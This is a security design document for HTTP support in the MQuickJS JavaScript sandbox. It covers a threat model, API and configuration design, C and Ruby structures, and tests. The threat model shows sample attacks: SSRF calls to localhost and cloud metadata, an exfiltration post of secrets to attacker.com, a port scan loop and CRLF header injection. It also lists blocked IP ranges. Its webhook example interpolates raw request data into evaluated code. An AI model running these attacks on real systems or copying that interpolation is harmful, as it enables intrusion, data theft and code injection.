# HTTP Support Security Design for MQuickJS Sandbox

## Threat Model

### 1. Server-Side Request Forgery (SSRF)

**Attack:** Accessing internal services, cloud metadata endpoints, or localhost
```javascript
// Malicious attempts
http.get('http://localhost:6379')           // Redis
http.get('http://169.254.169.254/latest')   // AWS metadata
http.get('http://192.168.1.1/admin')        // Internal network
```

**Mitigation:**
- Whitelist allowed domains/patterns
- Block private IP ranges (RFC 1918)
- Block localhost (127.0.0.0/8, ::1)
- Block link-local addresses (169.254.0.0/16)
- Block cloud metadata endpoints
- Perform DNS resolution AFTER whitelist check
- Block DNS rebinding (re-resolve before actual request)

### 2. Denial of Service (DoS)

**Attack:** Resource exhaustion
```javascript
// DoS attempts
while(true) { http.get('http://example.com') }  // Request flooding
http.get('http://evil.com/10gb-file')           // Large response
http.post('http://example.com', 'x'.repeat(1e9)) // Large request
```

**Mitigation:**
- Limit total requests per evaluation (default: 10)
- Limit concurrent requests (default: 2)
- Request timeout (default: 5 seconds)
- Max request size: headers + body (default: 1MB)
- Max response size (default: 1MB)
- Bandwidth throttling

### 3. Data Exfiltration

**Attack:** Leaking sensitive data to external servers
```javascript
// Exfiltration attempt
var secrets = getSecrets();
http.post('http://attacker.com/collect', JSON.stringify(secrets));
```

**Mitigation:**
- Strict whitelist of allowed domains
- No wildcard whitelisting by default
- Log all HTTP requests (audit trail)
- Optional: inspect request bodies for sensitive patterns

### 4. Port Scanning

**Attack:** Scanning internal network
```javascript
// Port scan attempt
for (var port = 1; port < 65536; port++) {
  http.get('http://192.168.1.1:' + port);
}
```

**Mitigation:**
- Whitelist specific ports or block non-standard ports
- Rate limiting
- Request count limits

### 5. Protocol Smuggling

**Attack:** HTTP request smuggling, header injection
```javascript
// Header injection attempt
http.get('http://example.com', {
  headers: {'X-Evil': 'value\r\nX-Injected: injected'}
});
```

**Mitigation:**
- Sanitize all headers
- Use a safe HTTP client library
- Validate header names and values
- Block CRLF in headers

### 6. Redirect Following

**Attack:** Bypassing whitelist via redirects
```javascript
// Redirect attack
http.get('http://allowed.com/redirect-to-internal');
// Server responds: 302 -> http://localhost:6379
```

**Mitigation:**
- Disable redirect following by default
- If enabled, validate redirect URLs against whitelist
- Limit redirect depth (max: 3)
- Log all redirect chains

### 7. DNS Rebinding

**Attack:** DNS changes between whitelist check and request
```javascript
// DNS rebinding
http.get('http://evil.com');
// DNS initially: 1.2.3.4 (passes whitelist)
// DNS changes to: 127.0.0.1 (internal access)
```

**Mitigation:**
- Resolve DNS and check IP against blacklist
- Cache DNS resolution
- Re-validate IP before connection
- Short DNS cache TTL

## API Design

### Simple, Synchronous HTTP API

mquickjs doesn't support promises or async/await, so all HTTP calls are synchronous.

```javascript
// ============================================================================
// CORE API
// ============================================================================

// GET request
var response = http.get(url);
var response = http.get(url, options);

// POST request
var response = http.post(url, body);
var response = http.post(url, body, options);

// Generic request
var response = http.request({
  method: 'GET',
  url: 'https://api.example.com/data',
  headers: {
    'Authorization': 'Bearer token',
    'Content-Type': 'application/json'
  },
  body: '{"key": "value"}',
  timeout: 3000
});

// ============================================================================
// RESPONSE OBJECT
// ============================================================================

response.status      // HTTP status code (200, 404, etc.)
response.statusText  // HTTP status text ('OK', 'Not Found', etc.)
response.headers     // Response headers as object
response.body        // Response body as string
response.ok          // true if status 200-299

// Convenience methods
response.json()      // Parse body as JSON
response.text()      // Get body as text (alias for .body)

// ============================================================================
// OPTIONS
// ============================================================================

{
  method: 'GET',           // HTTP method
  headers: {},             // Request headers
  body: '',                // Request body (string)
  timeout: 5000,           // Request timeout in ms
  followRedirects: false,  // Follow HTTP redirects
  maxRedirects: 0          // Max redirect hops
}

// ============================================================================
// ERROR HANDLING
// ============================================================================

try {
  var response = http.get('https://example.com');
  console.log(response.status);
} catch (e) {
  // Errors thrown:
  // - HTTPError: Request failed (network error, timeout, etc.)
  // - HTTPBlockedError: URL blocked by whitelist
  // - HTTPLimitError: Rate limit or size limit exceeded
  console.log(e.message);
}
```

### Ruby Configuration API

```ruby
# ============================================================================
# BASIC CONFIGURATION
# ============================================================================

sandbox = MQuickJS::Sandbox.new(
  http_enabled: true,
  http_config: {
    # Whitelist configuration
    whitelist: [
      'https://api.github.com/*',           # Wildcard paths
      'https://httpbin.org/**',             # Any subpath
      'https://*.example.com/api/*',        # Wildcard subdomain
      'https://specific.com:8080/*'         # Specific port
    ],

    # Request limits
    max_requests: 10,                       # Total requests per eval
    max_concurrent: 2,                      # Concurrent requests
    request_timeout: 5000,                  # Per-request timeout (ms)

    # Size limits
    max_request_size: 1_048_576,            # 1MB request size
    max_response_size: 1_048_576,           # 1MB response size

    # Behavior
    follow_redirects: false,                # Follow HTTP redirects
    max_redirects: 3,                       # Max redirect depth
    allowed_methods: ['GET', 'POST'],       # Allowed HTTP methods

    # Security
    block_private_ips: true,                # Block RFC 1918, localhost
    block_metadata: true,                   # Block cloud metadata
    allowed_ports: [80, 443, 8080],         # Allowed ports (nil = all)

    # Debugging
    log_requests: false                     # Log all HTTP requests
  }
)

# ============================================================================
# ADVANCED CONFIGURATION
# ============================================================================

# Custom IP blocking
sandbox = MQuickJS::Sandbox.new(
  http_enabled: true,
  http_config: {
    whitelist: ['https://api.example.com/*'],

    # Custom IP filters
    blocked_ip_ranges: [
      '10.0.0.0/8',
      '172.16.0.0/12',
      '192.168.0.0/16',
      '127.0.0.0/8',
      '169.254.0.0/16',
      '::1/128'
    ],

    # Custom header filtering
    blocked_headers: [
      'X-Forwarded-For',
      'X-Real-IP'
    ],

    # Custom validators
    request_validator: ->(req) {
      # Custom validation logic
      # Return true to allow, false to block
      !req.body.include?('password')
    },

    response_validator: ->(resp) {
      # Validate responses
      resp.headers['Content-Type']&.include?('json')
    }
  }
)

# ============================================================================
# USAGE
# ============================================================================

result = sandbox.eval(<<~JS)
  var response = http.get('https://api.github.com/users/octocat');
  if (response.ok) {
    var data = response.json();
    data.login;
  } else {
    'Error: ' + response.status;
  }
JS

# Access HTTP request log
result.http_requests  # Array of request metadata
# [
#   {
#     method: 'GET',
#     url: 'https://api.github.com/users/octocat',
#     status: 200,
#     duration_ms: 145,
#     request_size: 256,
#     response_size: 1024
#   }
# ]
```

## Implementation Architecture

### C Layer (libmquickjs wrapper)

```c
// HTTP request structure
typedef struct {
    char *url;
    char *method;
    char *body;
    size_t body_len;
    // Headers as key-value pairs
    char **header_keys;
    char **header_values;
    int header_count;
    int timeout_ms;
    int follow_redirects;
    int max_redirects;
} HTTPRequest;

// HTTP response structure
typedef struct {
    int status_code;
    char *status_text;
    char *body;
    size_t body_len;
    char **header_keys;
    char **header_values;
    int header_count;
} HTTPResponse;

// HTTP configuration
typedef struct {
    char **whitelist_patterns;
    int whitelist_count;
    int max_requests;
    int max_concurrent;
    int max_request_size;
    int max_response_size;
    int request_timeout;
    int block_private_ips;
    int block_metadata;
} HTTPConfig;

// Add to ContextWrapper
typedef struct {
    // ... existing fields ...
    HTTPConfig *http_config;
    int http_request_count;
    int http_concurrent_count;
} ContextWrapper;

// HTTP functions exposed to JS
JSValue js_http_request(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv);
JSValue js_http_get(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv);
JSValue js_http_post(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv);
```

### Ruby Layer

```ruby
module MQuickJS
  class HTTPConfig
    attr_reader :whitelist, :max_requests, :max_response_size

    def initialize(options = {})
      @whitelist = compile_patterns(options[:whitelist] || [])
      @max_requests = options[:max_requests] || 10
      @max_response_size = options[:max_response_size] || 1_048_576
      # ... more configuration
    end

    def allowed?(url)
      # Check URL against whitelist patterns
    end

    def blocked_ip?(ip)
      # Check IP against blacklist
    end

    private

    def compile_patterns(patterns)
      # Compile glob patterns to regex
    end
  end

  class HTTPRequest
    attr_reader :method, :url, :status, :duration_ms

    def initialize(data)
      @method = data[:method]
      @url = data[:url]
      @status = data[:status]
      @duration_ms = data[:duration_ms]
    end
  end

  class Result
    attr_reader :value, :console_output, :http_requests

    def initialize(value, console_output, console_truncated, http_requests = [])
      @value = value
      @console_output = console_output
      @console_truncated = console_truncated
      @http_requests = http_requests
    end
  end
end
```

## Security Best Practices

### 1. Whitelist Examples

```ruby
# Good: Specific endpoints
whitelist: [
  'https://api.github.com/users/*',
  'https://api.github.com/repos/*'
]

# Dangerous: Too broad
whitelist: [
  'http://**',              # Allows anything!
  'https://*.com/**'        # Too permissive
]

# Good: With port restrictions
whitelist: [
  'https://api.example.com:443/*'  # HTTPS only, specific port
]

# Dangerous: Non-standard ports
whitelist: [
  'http://example.com:6379/*'  # Redis port - suspicious
]
```

### 2. IP Blocking (Default)

```
# IPv4 Private Ranges (RFC 1918)
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16

# IPv4 Loopback
127.0.0.0/8

# IPv4 Link-Local
169.254.0.0/16

# IPv6 Loopback
::1/128

# IPv6 Link-Local
fe80::/10

# Cloud Metadata
169.254.169.254/32  # AWS, GCP, Azure
```

### 3. Default Configuration

```ruby
DEFAULT_HTTP_CONFIG = {
  whitelist: [],                      # No URLs allowed by default
  max_requests: 10,
  max_concurrent: 2,
  request_timeout: 5000,              # 5 seconds
  max_request_size: 1_048_576,        # 1MB
  max_response_size: 1_048_576,       # 1MB
  follow_redirects: false,
  max_redirects: 0,
  allowed_methods: ['GET', 'POST', 'PUT', 'DELETE'],
  block_private_ips: true,
  block_metadata: true,
  allowed_ports: [80, 443],           # HTTP and HTTPS only
  log_requests: true
}
```

## Future Enhancements

1. **Request Caching**: Cache responses to reduce external calls
2. **Mock Responses**: Define mock responses for testing
3. **Circuit Breaker**: Automatically block failing endpoints
4. **Rate Limiting by Domain**: Per-domain rate limits
5. **Custom DNS Resolver**: Use specific DNS servers
6. **TLS Certificate Validation**: Strict certificate checking
7. **Request Signing**: Add HMAC signatures to requests
8. **Webhook Support**: Allow incoming HTTP callbacks (carefully!)

## Example Use Cases

### 1. API Integration Testing

```ruby
sandbox = MQuickJS::Sandbox.new(
  http_enabled: true,
  http_config: {
    whitelist: ['https://jsonplaceholder.typicode.com/**']
  }
)

result = sandbox.eval(<<~JS)
  var response = http.get('https://jsonplaceholder.typicode.com/posts/1');
  var post = response.json();
  post.title;
JS
```

### 2. Web Scraping (Safe)

```ruby
sandbox = MQuickJS::Sandbox.new(
  http_enabled: true,
  http_config: {
    whitelist: ['https://example.com/api/*'],
    max_requests: 5
  }
)

result = sandbox.eval(<<~JS)
  var posts = [];
  for (var i = 1; i <= 5; i++) {
    var resp = http.get('https://example.com/api/posts/' + i);
    if (resp.ok) {
      posts.push(resp.json());
    }
  }
  posts.length;
JS
```

### 3. Webhook Processing

```ruby
# Process incoming webhook data
sandbox = MQuickJS::Sandbox.new(
  http_enabled: true,
  http_config: {
    whitelist: ['https://internal-api.company.com/process'],
    allowed_methods: ['POST']
  }
)

webhook_data = request.body.read
result = sandbox.eval(<<~JS)
  var webhook = #{webhook_data};

  // Transform data
  var processed = {
    id: webhook.id,
    timestamp: Date.now(),
    processed: true
  };

  // Send to internal API
  var resp = http.post(
    'https://internal-api.company.com/process',
    JSON.stringify(processed),
    { headers: { 'Content-Type': 'application/json' } }
  );

  resp.ok;
JS
```

## Testing Strategy

```ruby
describe 'HTTP Support' do
  it 'allows whitelisted URLs' do
    sandbox = MQuickJS::Sandbox.new(
      http_enabled: true,
      http_config: { whitelist: ['https://httpbin.org/*'] }
    )

    result = sandbox.eval("http.get('https://httpbin.org/get').status")
    expect(result.value).to eq(200)
  end

  it 'blocks non-whitelisted URLs' do
    sandbox = MQuickJS::Sandbox.new(
      http_enabled: true,
      http_config: { whitelist: ['https://allowed.com/*'] }
    )

    expect {
      sandbox.eval("http.get('https://evil.com/data')")
    }.to raise_error(MQuickJS::HTTPBlockedError)
  end

  it 'blocks private IPs' do
    expect {
      sandbox.eval("http.get('http://192.168.1.1/')")
    }.to raise_error(MQuickJS::HTTPBlockedError)
  end

  it 'enforces request limits' do
    sandbox = MQuickJS::Sandbox.new(
      http_enabled: true,
      http_config: {
        whitelist: ['https://httpbin.org/*'],
        max_requests: 2
      }
    )

    expect {
      sandbox.eval(<<~JS)
        http.get('https://httpbin.org/get');
        http.get('https://httpbin.org/get');
        http.get('https://httpbin.org/get'); // 3rd request
      JS
    }.to raise_error(MQuickJS::HTTPLimitError)
  end
end
```
